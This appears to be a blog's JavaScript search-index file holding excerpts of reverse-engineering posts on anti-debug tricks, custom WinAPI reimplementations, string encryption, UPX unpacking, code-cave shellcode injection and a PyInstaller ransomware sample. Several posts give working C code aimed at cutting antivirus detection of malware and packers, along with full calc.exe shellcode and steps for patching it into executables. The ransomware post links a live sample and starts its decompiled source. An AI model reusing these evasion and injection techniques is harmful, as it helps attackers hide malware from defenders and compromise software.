var store = [{
        "title": "AV Evasion: Anti-debug tricks",
        "excerpt":"Reducing AV detections   One of the most common techniques malware authors use to create FUD (Fully Undetectable) malware is anti-debugging.   Practically every anti-virus solution opens the target executable with some form of debugging or inspection enabled‚Äî Sometimes obvious, sometimes very stealthy. Here‚Äôs an example of function hooking in VirusTotal Jujubox:      What you have to know   Surprisingly: it‚Äôs often the least suspicious reactions (like a program immediately exiting without modifying anything), that trigger antivirus detection the most.   This is why instead of simply terminating when a debugger is detected, it‚Äôs better to reroute execution and behave like an entirely different (but still ‚Äúnormal-looking‚Äù) program.   For example: instead of exiting the program when a debugger is detected:  if (IsDebuggerPresent()) {     // Debugger found     ExitProcess();     return 1; }  Do something like:  if (IsDebuggerPresent()) {     // Debugger found     printf(\"%s\", \"Welcome to my Fibonacci number printer!\");     unsigned long long sum = 0;     unsigned long long num1 = 0;     unsigned long long num2 = 1;     unsigned long long upto;     printf(\"Generate fibonacci numbers up to:\");     scanf(\"%d\", upto);     printf(\"%d\\n\", num1);     printf(\"%d\\n\", num2);     while (sum &lt; upto) {         sum = num1 + num2;         printf(\"%d\\n\", sum);         num1 = num2;         num2 = sum;     }     return 1; } // Nefarious code goes here!   route execution to an entirely different ‚Äúlegit‚Äù routine that acts as a random number generator, for example, and only then close the program.   Anti-debugging methods   A classic ‚Äúone-liner‚Äù anti-debug trick I used in my crackme looks like this:   if (*(BYTE*)(__readgsqword(0x60) + 2)) {     // Debugger detected  The logic behind this line is simple.   __readgsqword(0x60) // &lt;-- gets the Process Environment Block address   + 2 // &lt;-- 0x02 bytes offset from PEB contains the BeingDebugged field  üëâ BeingDebugged is a boolean (1 byte) that tells whether a debugger is attached to the process!   If BeingDebugged == 1, then you are being debugged (proabably by x64dbg)   If BeingDebugged == 0, then no debugger attached.  (*(BYTE*) // A dereference that reads the BeingDebugged boolean   ","categories": ["AV-evasion"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/antidebug/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/evadingavs/anti-debug/image.jpg"
      },{
        "title": "AV Evasion: Custom WinAPI function implementations",
        "excerpt":"Reducing AV detections   Malware authors work 24/7 to find breakthroughs that will allow them to create FUD (Fully Undetected) malware.   There‚Äôs even a dedicated marketplace on YouTube and Telegram for people selling their so-called ‚ÄúFUD crypters‚Äù  that will claim to make any exe payload (including actual rat builds) ‚Äúhave almost 0 detections on virustotal:‚Äù         And here‚Äôs an example of how one of these FUD crypters look like:      How do they do this?   It‚Äôs a combination of many different techniques. In this post, we‚Äôll cover the most basic one:      Custom WinAPI function implementations   Let‚Äôs start with custom WinAPI function implementations:   As you may know, AVs look for programs that use ‚Äúsuspicious‚Äù WinAPI functions. We‚Äôre talking GetModuleHandle, GetProcAddress, VirtualAlloc, etc.   Of course, these functions have legitimate uses, but they‚Äôre frequently used by malware authors.   The solution   Instead of directly calling a CRT function like VirtualAlloc, malware authors will create their own ‚Äúcustom implementations‚Äù of these functions.   For example, instead of calling GetModuleHandleW directly from the CRT (which is hooked to death by AV solutions):      They will create a custom function (myGetModuleHandle) that is meant to functionally replicate the original GetModuleHandleW, so that, instead of calling GetModuleHandleW, we will call myGetModuleHandle which looks a lot less suspicious, since it looks like a normal function in our code.   Here‚Äôs an example of a custom myGetModuleHandle implementation that I used in my custom .exe packer:      As you can see, it manually walks over the linked list of modules (inside the PEB), copies the target module name (ModuleName) and the current module‚Äôs full path (FullDllName) into buffers, and checks if the current module name contains (or matches) the target name (case-insensitive partial match).   If it matches, we return the base address (DllBase) of the loaded module:  return (HMODULE)pEntry-&gt;DllBase;  If it walks through all modules without a match:  return NULL;   We can then call this custom function in our code. So, instead of doing:  GetModuleHandleW(L\"ntdll.dll\") // ‚ùå &lt;-- Hooked!  We will call our custom function:  myGetModuleHandleW(L\"ntdll.dll\") // ‚úÖ &lt;-- Looks like a normal function!  For my custom packer, I implemented these custom functions: myVirtualAlloc, MyLoadLibrary, myGetModuleHandle, myGetProcAddress.   Below is the code for them:   Custom GetProcAddress:  FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) { \tPIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; \tPIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)hModule + dosHeader-&gt;e_lfanew); \tPIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);  \tDWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfFunctions); \tWORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNameOrdinals); \tDWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNames); \tfor (DWORD i = 0; i &lt; exportDirectory-&gt;NumberOfNames; i++) { \t\tif (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) { \t\t\treturn (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]); \t\t} \t} \treturn NULL;  }   Custom GetModuleHandle:   HMODULE myGetModuleHandle(LPCWSTR ModuleName) { \tPEB* pPeb = (PEB*)__readgsqword(0x60); \tPEB_LDR_DATA* Ldr = pPeb-&gt;Ldr; \tLIST_ENTRY* ModuleList = &amp;Ldr-&gt;InMemoryOrderModuleList; \tLIST_ENTRY* pStartListEntry = ModuleList-&gt;Flink; \tWCHAR inputModule[MAX_PATH] = { 0 }; \tWCHAR targetModule[MAX_PATH] = { 0 }; \tfor (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry-&gt;Flink) { \t\t \t\tLDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY)); \t\twcscpy_s(targetModule, MAX_PATH, ModuleName); \t\twcscpy_s(inputModule, MAX_PATH, pEntry-&gt;FullDllName.Buffer);  \t\tif (StrStrW(inputModule, targetModule) != NULL) { \t\t\treturn (HMODULE)pEntry-&gt;DllBase; \t\t} \t} \treturn NULL; }   Custom LoadLibrary:  typedef NTSTATUS(NTAPI* pLdrLoadDll) ( \tPWCHAR PathToFile, \tULONG Flags, \tPUNICODE_STRING ModuleFileName, \tPHANDLE ModuleHandle \t); HMODULE MyLoadLibrary(LPCWSTR lpFileName) { \tUNICODE_STRING ustrModule; \tHANDLE hModule = NULL;  \tHMODULE hNtdll = myGetModuleHandle((LPCWSTR)L\"ntdll.dll\"); \tpRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)myGetProcAddress(hNtdll, \"RtlInitUnicodeString\");  \tRtlInitUnicodeString(&amp;ustrModule, lpFileName);  \tpLdrLoadDll myLdrLoadDll = (pLdrLoadDll)myGetProcAddress(myGetModuleHandle(L\"ntdll.dll\"), \"LdrLoadDll\"); \tif (!myLdrLoadDll) { \t\treturn NULL; \t}  \tNTSTATUS status = myLdrLoadDll(NULL, 0, &amp;ustrModule, &amp;hModule); \treturn (HMODULE)hModule; }   Custom VirtualAlloc:   typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)( \tHANDLE ProcessHandle, \tPVOID* BaseAddress, \tULONG_PTR ZeroBits, \tPSIZE_T RegionSize, \tULONG AllocationType, \tULONG Protect \t);  LPVOID myVirtualAlloc(SIZE_T size, DWORD allocationType, DWORD protect) { \tHMODULE ntdll = myGetModuleHandle((LPCWSTR)L\"ntdll.dll\"); \tif (ntdll == NULL) { \t\tprintf(\"Failed to get address of NtAllocateVirtualMemory\\n\"); \t\treturn NULL; \t} \tpNtAllocateVirtualMemory myAllocateVirtualMemory = (pNtAllocateVirtualMemory)myGetProcAddress(ntdll, \"NtAllocateVirtualMemory\"); \tif (!myAllocateVirtualMemory) { \t\tprintf(\"Failed to get address of NtAllocateVirtualMemory\\n\"); \t\treturn NULL; \t} \tPVOID baseAddress = NULL; \tSIZE_T regionSize = size;  \tNTSTATUS status = myAllocateVirtualMemory( \t\tGetCurrentProcess(), \t\t&amp;baseAddress, \t\t0, \t\t&amp;regionSize, \t\tallocationType, \t\tprotect \t); \treturn baseAddress;  }   Combined with some other tricks, these custom functions reduced the detections of my packer to around 5 detections on VirusTotal:      Before the custom functions, my packer was at around 19 detections.   ","categories": ["AV-evasion"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/evadingavs/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/evadingavs/customfunctions/detections.png"
      },{
        "title": "Explaining encrypted strings in .exe files",
        "excerpt":"Encrypted strings   Have you ever tried solving a crackme, only to be baffled as to why the strings like \"Wrong Password! don‚Äôt appear in x64dbg‚Äôs string references search?   The answer is simple: String encryption.   When you search for string references in x64dbg, it looks for recognizable ASCII sequences in the static file (the .exe as it sits on disk).   This works for programs that store their strings as raw text, like this:      The corresponding hexadecimal for \"Hello, World!\" would look like:  48 65 6C 6C 6F 2C 20 57 6F 72 6C 64 21   However, real-world programs (and many crackmes) often don‚Äôt store strings like that. Instead, they encrypt the strings ‚Äî so the actual file on disk doesn‚Äôt contain \"Hello, World!\", but some meaningless-looking bytes, like this:      One of the most common methods used in crackmes is XOR encryption.  Here‚Äôs a basic C example to show how it works:   #include &lt;stdio.h&gt;  void decrypt(char *output, const unsigned char *encrypted, int length, unsigned char key) {     for (int i = 0; i &lt; length; i++) {         output[i] = encrypted[i] ^ key;     }     output[length] = '\\0'; // Null-terminate }  int main() {     // XOR encrypted version of \"Hello, World!\" with key 0xAA     unsigned char encrypted[] = {         0xE2, 0xCF, 0xC6, 0xC6, 0xC5, 0x86, 0xEA, 0xC5, 0xD8, 0xC6, 0xC5, 0xCE, 0x8B     };     int length = sizeof(encrypted) / sizeof(encrypted[0]);     unsigned char key = 0xAA;      char decrypted[100];      decrypt(decrypted, encrypted, length, key);      printf(\"Decrypted string: %s\\n\", decrypted);      return 0; }   Instead of writing:  char string[] = \"Hello, World!\";  the program stores an encrypted version of the string:  unsigned char encrypted[] = {         0xE2, 0xCF, 0xC6, 0xC6, 0xC5, 0x86, 0xEA, 0xC5, 0xD8, 0xC6, 0xC5, 0xCE, 0x8B     };  At runtime, the program decrypts it back before using it. Here‚Äôs how the encrypted bytes look on disk:      Hex representation:  E2 CF C6 C6 C5 86 EA C5 D8 C6 C5 CE 8B   Hopefully, you now understand why x64dbg misses those strings in search: They are simply encrypted.   In the next chapter, we‚Äôll explain how to find the decryption routines without having to rely on a simple string search.   Stay tuned!   ","categories": ["Unpacking"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/encryptedstrings/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/unpacking/encryptedstrings/thumbnail.png"
      },{
        "title": "Unpacking UPX (MinGW example)",
        "excerpt":"Unpacking UPX   In this project, we‚Äôll explore how to modify the strings (text) of executable files. When we run an executable file, strings like ‚ÄúHello World!‚Äù that appear on the GUI are usually located in the rdata or .data segments. These are parts of the PE file structure used by the program to hold constant values like string literals.   Below is an example of these data segments shown in the program CFF Explorer, for my crackme LSDtrip.exe:    As you can see, it indeed contains the strings of the program:     In these kinds of executables, where the string are statically stored in the binary, we can simply load them up in a Hex editor like HxD and modify these values:      The unpacking process   The main problem is that, in most commercial programs, this won‚Äôt be as straightforward. Programs often don‚Äôt store the string ‚Äúas-is‚Äù in the binary. Instead, they use a process called ‚Äúpacking‚Äù, where static variables are encrypted within the binary. At runtime, these encrypted strings are unpacked through a loop of assembly instructions, then loaded into memory and displayed in the GUI. This means that, in the executable binary, instead of seeing \"Hello World\", you‚Äôll see something like `+@#4$g9j&amp;f7%$l%5.   To modify these strings, we need to ‚Äúunpack‚Äù the program. This means saving the executable code at a memory state where the program has already decrypted all the static string variables. This way, all the decrypted strings will be contained within our .exe file, and we could then easily change them.   For this process, we will use a debugger called x32dbg and its built-in plugin for dumping, Scylla.    We will unpack an example UPX-packed MinGW executable. First, we open it in x32dbg, and click F9 until we reach the pushad instruction. Then, we‚Äôll press Ctrl + F to search for the assembly instruction popad and locate it in the code:            Then, we set a breakpoint at the nearest jmp instruction to popad. In this case, it‚Äôs jmp 0x00401580. We‚Äôll set a breakpoint on this address, and then we‚Äôll press F7 (Step Over).      As you can see, the instruction jmp 0x00401580 takes us to push ebp. This is the OEP (Original Entry Point) of the program, meaning it‚Äôs at this instruction where the program finished unpacking itself and is ready for the actual intended code execution after unpacking.    Now, we will open the plugin Scylla in x32dbg. We specify the OEP address, which is the instruction push ebp, address 00401580. Now, we‚Äôll click IAT Autosearch and Get Imports:    Next, we click Dump to save the unpacked executable:      Fixing the imports   The file is saved as dump.exe. However, when we attempt to open it, an error message appears:      This error occurs because the imports are corrupted. To fix this, we return to Scylla, click Fix Dump, and select our dumped file, dump.exe:    After fixing the imports, we have a working unpacked executable that we can modify, dumped_SCY.exe      Now, we can open the unpacked dumped_SCY.exe with HxD and modify the strings as needed:     ","categories": ["Unpacking"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/unpackingupx/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/unpacking/MinGW/demo.png"
      },{
        "title": "Using code caves to inject custom shellcode",
        "excerpt":"Code caves   First of all, what are code caves?   Code caves are a chunk of null bytes (0x00) in a process‚Äôs memory. Here‚Äôs how they look like in x64dbg:      Instead of 0x00 caves, you can also find 0x90 (NOP) sleds which can also function as code caves:      How to find these code caves?   Most of the times, it‚Äôs pretty easy. Just open the target process with x64dbg and scroll down to the end until you see a bunch of these null instructions:  0040269D | 0000                     | add byte ptr ds:[eax],al                | 0040269F | 0000                     | add byte ptr ds:[eax],al                | 004026A1 | 0000                     | add byte ptr ds:[eax],al                | 004026A3 | 0000                     | add byte ptr ds:[eax],al                | 004026A5 | 0000                     | add byte ptr ds:[eax],al                | 004026A7 | 0000                     | add byte ptr ds:[eax],al                | 004026A9 | 0000                     | add byte ptr ds:[eax],al                |  You can then paste your shellcode in place of these null instructions (tutorial below).   If you want, you can also use Cheat Engine‚Äôs ‚ÄúScan for code caves‚Äù feature (CTRL + ALT + C in the Memory Viewer):      Then untick ‚ÄúAlso scan non-executable read only memory‚Äù (because we want to inject executable shellcode):      You‚Äôll then be able to see a list of many empty executable addresses within the process‚Äôs memory state, that you can use to write your shellcode in:    Taking advantage of code caves to inject shellcode   As you may know, we can take advantage of these unused bytes to directly inject raw executable opcodes (shellcode) within the application.   We can use this simple x86 shellcode that opens a calculator (calc.exe):    // open calc.exe (195 bytes x86 shellcode). unsigned char shellcode[] =  \"\\x89\\xe5\\x83\\xec\\x20\\x31\\xdb\\x64\\x8b\\x5b\\x30\\x8b\\x5b\\x0c\\x8b\\x5b\" \"\\x1c\\x8b\\x1b\\x8b\\x1b\\x8b\\x43\\x08\\x89\\x45\\xfc\\x8b\\x58\\x3c\\x01\\xc3\" \"\\x8b\\x5b\\x78\\x01\\xc3\\x8b\\x7b\\x20\\x01\\xc7\\x89\\x7d\\xf8\\x8b\\x4b\\x24\" \"\\x01\\xc1\\x89\\x4d\\xf4\\x8b\\x53\\x1c\\x01\\xc2\\x89\\x55\\xf0\\x8b\\x53\\x14\" \"\\x89\\x55\\xec\\xeb\\x32\\x31\\xc0\\x8b\\x55\\xec\\x8b\\x7d\\xf8\\x8b\\x75\\x18\" \"\\x31\\xc9\\xfc\\x8b\\x3c\\x87\\x03\\x7d\\xfc\\x66\\x83\\xc1\\x08\\xf3\\xa6\\x74\" \"\\x05\\x40\\x39\\xd0\\x72\\xe4\\x8b\\x4d\\xf4\\x8b\\x55\\xf0\\x66\\x8b\\x04\\x41\" \"\\x8b\\x04\\x82\\x03\\x45\\xfc\\xc3\\xba\\x78\\x78\\x65\\x63\\xc1\\xea\\x08\\x52\" \"\\x68\\x57\\x69\\x6e\\x45\\x89\\x65\\x18\\xe8\\xb8\\xff\\xff\\xff\\x31\\xc9\\x51\" \"\\x68\\x2e\\x65\\x78\\x65\\x68\\x63\\x61\\x6c\\x63\\x89\\xe3\\x41\\x51\\x53\\xff\" \"\\xd0\\x31\\xc9\\xb9\\x01\\x65\\x73\\x73\\xc1\\xe9\\x08\\x51\\x68\\x50\\x72\\x6f\" \"\\x63\\x68\\x45\\x78\\x69\\x74\\x89\\x65\\x18\\xe8\\x87\\xff\\xff\\xff\\x31\\xd2\" \"\\x52\\xff\\xd0\";   First, we‚Äôll go to the code cave, and add the following instructions:   pushad pushfd   The x86 instruction pushad pushes all of the general-purpose register onto the stack, and the pushfd instruction pushes all the EFLAGS register onto the stack.   We need these instructions because we will need to restore the original register state and jump back to the original execution flow after executing our shellcode:    We can then paste our shellcode after those 2 initial instructions:      We now have this code instead of the initial 0x00 bytes:  00401D5D | 60                       | pushad                                  | // &lt;--- Pushes the contents of the general-purpose registers onto the stack 00401D5E | 9C                       | pushfd                                  | // &lt;--- Pushes the entire contents of the EFLAGS register onto the stack 00401D5F | 89E5                     | mov ebp,esp                             | // We now paste our shellcode 00401D61 | 83EC 20                  | sub esp,20                              | 00401D64 | 31DB                     | xor ebx,ebx                             | 00401D66 | 64:8B5B 30               | mov ebx,dword ptr fs:[ebx+30]           | 00401D6A | 8B5B 0C                  | mov ebx,dword ptr ds:[ebx+C]            | 00401D6D | 8B5B 1C                  | mov ebx,dword ptr ds:[ebx+1C]           | 00401D70 | 8B1B                     | mov ebx,dword ptr ds:[ebx]              | 00401D72 | 8B1B                     | mov ebx,dword ptr ds:[ebx]              | 00401D74 | 8B43 08                  | mov eax,dword ptr ds:[ebx+8]            | 00401D77 | 8945 FC                  | mov dword ptr ss:[ebp-4],eax            | 00401D7A | 8B58 3C                  | mov ebx,dword ptr ds:[eax+3C]           | 00401D7D | 01C3                     | add ebx,eax                             | 00401D7F | 8B5B 78                  | mov ebx,dword ptr ds:[ebx+78]           | 00401D82 | 01C3                     | add ebx,eax                             | 00401D84 | 8B7B 20                  | mov edi,dword ptr ds:[ebx+20]           | edi:EntryPoint 00401D87 | 01C7                     | add edi,eax                             | edi:EntryPoint 00401D89 | 897D F8                  | mov dword ptr ss:[ebp-8],edi            | edi:EntryPoint 00401D8C | 8B4B 24                  | mov ecx,dword ptr ds:[ebx+24]           | ecx:EntryPoint 00401D8F | 01C1                     | add ecx,eax                             | ecx:EntryPoint 00401D91 | 894D F4                  | mov dword ptr ss:[ebp-C],ecx            | ecx:EntryPoint 00401D94 | 8B53 1C                  | mov edx,dword ptr ds:[ebx+1C]           | edx:EntryPoint 00401D97 | 01C2                     | add edx,eax                             | edx:EntryPoint 00401D99 | 8955 F0                  | mov dword ptr ss:[ebp-10],edx           | edx:EntryPoint 00401D9C | 8B53 14                  | mov edx,dword ptr ds:[ebx+14]           | edx:EntryPoint 00401D9F | 8955 EC                  | mov dword ptr ss:[ebp-14],edx           | edx:EntryPoint 00401DA2 | EB 32                    | jmp codecaving.401DD6                   | 00401DA4 | 31C0                     | xor eax,eax                             | 00401DA6 | 8B55 EC                  | mov edx,dword ptr ss:[ebp-14]           | edx:EntryPoint 00401DA9 | 8B7D F8                  | mov edi,dword ptr ss:[ebp-8]            | edi:EntryPoint 00401DAC | 8B75 18                  | mov esi,dword ptr ss:[ebp+18]           | esi:EntryPoint 00401DAF | 31C9                     | xor ecx,ecx                             | ecx:EntryPoint 00401DB1 | FC                       | cld                                     | 00401DB2 | 8B3C87                   | mov edi,dword ptr ds:[edi+eax*4]        | edi:EntryPoint 00401DB5 | 037D FC                  | add edi,dword ptr ss:[ebp-4]            | edi:EntryPoint 00401DB8 | 66:83C1 08               | add cx,8                                | 00401DBC | F3:A6                    | repe cmpsb                              | 00401DBE | 74 05                    | je codecaving.401DC5                    | 00401DC0 | 40                       | inc eax                                 | 00401DC1 | 39D0                     | cmp eax,edx                             | edx:EntryPoint 00401DC3 | 72 E4                    | jb codecaving.401DA9                    | 00401DC5 | 8B4D F4                  | mov ecx,dword ptr ss:[ebp-C]            | ecx:EntryPoint 00401DC8 | 8B55 F0                  | mov edx,dword ptr ss:[ebp-10]           | edx:EntryPoint 00401DCB | 66:8B0441                | mov ax,word ptr ds:[ecx+eax*2]          | 00401DCF | 8B0482                   | mov eax,dword ptr ds:[edx+eax*4]        | 00401DD2 | 0345 FC                  | add eax,dword ptr ss:[ebp-4]            | 00401DD5 | C3                       | ret                                     | 00401DD6 | BA 78786563              | mov edx,63657878                        | edx:EntryPoint 00401DDB | C1EA 08                  | shr edx,8                               | edx:EntryPoint 00401DDE | 52                       | push edx                                | edx:EntryPoint 00401DDF | 68 57696E45              | push 456E6957                           | 00401DE4 | 8965 18                  | mov dword ptr ss:[ebp+18],esp           | 00401DE7 | E8 B8FFFFFF              | call codecaving.401DA4                  | 00401DEC | 31C9                     | xor ecx,ecx                             | ecx:EntryPoint 00401DEE | 51                       | push ecx                                | ecx:EntryPoint 00401DEF | 68 2E657865              | push 6578652E                           | 00401DF4 | 68 63616C63              | push 636C6163                           | 00401DF9 | 89E3                     | mov ebx,esp                             | 00401DFB | 41                       | inc ecx                                 | ecx:EntryPoint 00401DFC | 51                       | push ecx                                | ecx:EntryPoint 00401DFD | 53                       | push ebx                                | 00401DFE | FFD0                     | call eax                                | 00401E00 | E8 A5020000              | call codecaving.4020AA                  | // end of shellcode   Now, after we pasted our shellcode, we need to modify our exe‚Äôs code so that we jmp to the address of the start of the shellcode (00401D5D),   and then add a jmp instruction at the end of the shellcode to jmp back to the original execution flow (so that we don‚Äôt break the program).   I chose this instruction to modify:  jmp 0x00401D14  So first, let‚Äôs modify that instruction instruction to jmp to the start of our shellcode (at address 00401D5D) instead of 00401D14   So instead of jmp 0x00401D14, it will be jmp 00401D5D:    And then at the end of our shellcode, we add a jmp instruction to the address that the original jmp was meant to jump to (0x00401D14):      Now, after applying our patches in x64dbg, we can see that the program also launches calc.exe alongside its original payload:      Shellcode injection in x64 processes   In x64, there‚Äôs no pushad or pushfd instruction; you‚Äôd have to manually push all of the general-purpose registers.   So, in an x64 process, we‚Äôll write these instructions before writing our shellcode:  push rbx push rcx push rdx push rsi push rdi push rbp push r8 push r9 push r10 push r11 push r12 push r13 push r14 push r15     I will use this x64 shellcode to open calc.exe:  unsigned char array[] = {     0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58, 0x60, 0x48, 0x8B, 0x5B, 0x18, 0x48,     0x8B, 0x5B, 0x20, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x5B, 0x20, 0x49, 0x89, 0xD8,     0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31, 0xC9, 0x66, 0x81, 0xC1, 0xFF, 0x88, 0x48, 0xC1,     0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x4D, 0x31, 0xD2, 0x44, 0x8B, 0x52, 0x1C, 0x4D,     0x01, 0xC2, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4D, 0x31, 0xE4, 0x44,     0x8B, 0x62, 0x24, 0x4D, 0x01, 0xC4, 0xEB, 0x32, 0x5B, 0x59, 0x48, 0x31, 0xC0, 0x48, 0x89, 0xE2,     0x51, 0x48, 0x8B, 0x0C, 0x24, 0x48, 0x31, 0xFF, 0x41, 0x8B, 0x3C, 0x83, 0x4C, 0x01, 0xC7, 0x48,     0x89, 0xD6, 0xF3, 0xA6, 0x74, 0x05, 0x48, 0xFF, 0xC0, 0xEB, 0xE6, 0x59, 0x66, 0x41, 0x8B, 0x04,     0x44, 0x41, 0x8B, 0x04, 0x82, 0x4C, 0x01, 0xC0, 0x53, 0xC3, 0x48, 0x31, 0xC9, 0x80, 0xC1, 0x07,     0x48, 0xB8, 0x0F, 0xA8, 0x96, 0x91, 0xBA, 0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8,     0x08, 0x50, 0x51, 0xE8, 0xB0, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xC6, 0x48, 0x31, 0xC9, 0x48, 0xF7,     0xE1, 0x50, 0x48, 0xB8, 0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7, 0xD0, 0x50,     0x48, 0x89, 0xE1, 0x48, 0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xFF, 0xD6 };   Let‚Äôs write this shellcode after the initial push instructions:      After writing our shellcode, we‚Äôll pop the general purpose registers:      Now, from somewhere within the actual process‚Äôs execution flow, we will have to jump to the start of our shellcode so that it gets executed.   This is the starting instruction of our shellcode:  00007FF6B14323F4 | 53                       | push rbx                                |  At address 00007FF6B1431408, the Entry Point instruction is located. I will modify that instruction with a jmp to the start of our shellcode:  jmp 0x00007FF6B14323F4 // this address contains the first instruction in our shellcode     And, at the end, we jump back to the instruction that comes right after that initial jump we made, so the program continues as if nothing happened.      This is our our final shellcode looks like:   push rbx // &lt;--- manually pushing all of the general-purpose registers onto the stack (for preservation) push rcx push rdx push rsi push rdi push rbp push r8 push r9 push r10 push r11 push r12 push r13 push r14 push r15 // &lt;--- pushing ends here xor rdi,rdi // &lt;--- start of shellcode! mul rdi mov rbx,qword ptr gs:[rax+60] mov rbx,qword ptr ds:[rbx+18] mov rbx,qword ptr ds:[rbx+20] mov rbx,qword ptr ds:[rbx] mov rbx,qword ptr ds:[rbx] mov rbx,qword ptr ds:[rbx+20] mov r8,rbx mov ebx,dword ptr ds:[rbx+3C] add rbx,r8 xor rcx,rcx add cx,88FF shr rcx,8 mov edx,dword ptr ds:[rbx+rcx] add rdx,r8 xor r10,r10 mov r10d,dword ptr ds:[rdx+1C] add r10,r8 xor r11,r11 mov r11d,dword ptr ds:[rdx+20] add r11,r8 xor r12,r12 mov r12d,dword ptr ds:[rdx+24] add r12,r8 jmp cracked27 codecave.7FF601E32494 pop rbx pop rcx xor rax,rax mov rdx,rsp push rcx mov rcx,qword ptr ss:[rsp] xor rdi,rdi mov edi,dword ptr ds:[r11+rax*4] add rdi,r8 mov rsi,rdx repe cmpsb  je cracked27 codecave.7FF601E32485 inc rax jmp cracked27 codecave.7FF601E3246B pop rcx mov ax,word ptr ds:[r12+rax*2] mov eax,dword ptr ds:[r10+rax*4] add rax,r8 push rbx ret  xor rcx,rcx add cl,7 mov rax,9C9A87BA9196A80F not rax shr rax,8 push rax push rcx call cracked27 codecave.7FF601E32462 mov r14,rax xor rcx,rcx mul rcx push rax mov rax,9A879AD19C939E9C not rax push rax mov rcx,rsp inc rdx sub rsp,20 call r14 // &lt;--- end of shellcode! pop r15 // &lt;--- popping all the general purpose registers from the stack (to restore register state) pop r14 pop r13 pop r12 pop r10 pop r9 pop r8 pop rbp pop rdi pop rsi pop rdx pop rcx pop rbx mov qword ptr ss:[rsp+18],rbx jmp cracked27 codecave.7FF601E3140D // &lt;--- Jumping back   And we can see that the patched file opens calc.exe alongside its original payload:     ","categories": ["Injection"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/injection/codecaves/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/injection/codecaves/codecaves.png"
      },{
        "title": "Decoding a Pyinstaller ransomware sample",
        "excerpt":"Note: if you want to download this ransomware sample for educational purposes, feel free to do so by clicking here: password: infected   Introduction   Recently, I‚Äôve came across this Python ransomware sample:    First, here‚Äôs the ransom note:    Now, let‚Äôs start examining the .exe file statically.  Understanding the file  Here‚Äôs the Detect It Easy output:    We can clearly see that the program is a python-compiled executable, by examining the hexadecimal artifacts:      Now, let‚Äôs jump to reversing the file!   We will use the Python script pyinstxtractor to extract and analyze the contents of this pyinstaller generated executable file:  Unpacking pyinstaller resources     We received the output from pyinstxtractor:  C:\\Users\\WDAGUtilityAccount\\Downloads\\analyzing&gt;pyinstxtractor.py Encryptor.exe [+] Processing Encryptor.exe [+] Pyinstaller version: 2.1+ [+] Python version: 3.13 [+] Length of package: 21092376 bytes [+] Found 120 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: pyi_rth_cryptography_openssl.pyc [+] Possible entry point: pyi_rth_pywintypes.pyc [+] Possible entry point: pyi_rth_pythoncom.pyc [+] Possible entry point: pyi_rth_pkgres.pyc [+] Possible entry point: pyi_rth_multiprocessing.pyc [+] Possible entry point: pyi_rth_setuptools.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: Encryptor.pyc [+] Found 609 files in PYZ archive [+] Successfully extracted pyinstaller archive: Encryptor.exe    You can now use a python decompiler on the pyc files within the extracted directory.   So, let‚Äôs go to the newly generated Encrypted.exe_extracted folder:      This ransomware sample clearly uses a lot of cryptographic libraries.   This Encrypted.pyc file is one of the files in the Encrypted.exe_extracted folder:      Now, we need to decompile the Encrypted.pyc file we received from pyinstxtractor. For that, we‚Äôll use the web interface of this library called pylingual, that decompiles .pyc files containing the compiled bytecode of the ransomware‚Äôs main Python source code:   Pylingual gave us a great reconstruction of the source code:  Reconstructed source code   # Decompiled with PyLingual (https://pylingual.io) # Internal filename: Encryptor.py # Bytecode version: 3.13.0rc3 (3571) # Source timestamp: 1970-01-01 00:00:00 UTC (0)  from pathlib import Path from PIL import Image, ImageDraw, ImageFont import ctypes import string import subprocess import shutil import base64 import sys from win32com.client import Dispatch from win32api import GetSystemMetrics from PIL import Image, ImageDraw, ImageFont 